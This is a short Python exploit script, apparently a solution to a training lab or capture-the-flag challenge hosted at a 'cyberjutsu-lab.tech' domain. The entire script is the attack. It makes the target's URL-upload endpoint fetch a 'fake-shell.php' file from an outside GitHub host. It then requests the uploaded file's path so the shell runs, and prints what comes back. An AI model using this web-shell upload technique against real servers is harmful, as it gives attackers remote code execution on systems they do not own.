import urllib.request
import urllib.parse
import json

image_url = urllib.parse.quote(
    "https://github.com/xuantungmta/test/raw/main/test/fake-shell.php")
url = "https://upload.koinbase.cyberjutsu-lab.tech/index.php?url=" + image_url
response = urllib.request.urlopen(url)
if response:
    response = json.load(response)
    # print(response)
    url_payload = "https://upload.koinbase.cyberjutsu-lab.tech/" + \
        response['message']
    contents = urllib.request.urlopen(url_payload).read()
    if contents:
        print(str(contents).replace("\\n", "\n"))
